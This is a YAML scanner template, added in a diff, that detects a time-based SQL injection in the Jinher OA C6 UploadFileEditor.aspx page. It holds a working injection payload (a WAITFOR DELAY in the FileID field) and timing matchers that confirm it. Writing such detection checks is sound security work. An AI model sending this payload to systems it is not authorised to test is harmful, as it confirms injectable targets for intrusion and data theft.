@@ -1,0 +1,35 @@
+id: jinher-oa-jc6-UploadFileEditor-sqli
+info:
+  name: 金和OA-UploadFileEditor - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E9%87%91%E5%92%8COA-UploadFileEditor-SQL.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: jinher,oa,c6,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /C6/Control/UploadFileEditor.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        FileID=1';WAITFOR+DELAY'0:0:6'--+
+
+    matchers:
+      - type: dsl
+        dsl:
+          # - contains_all(body,'')
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
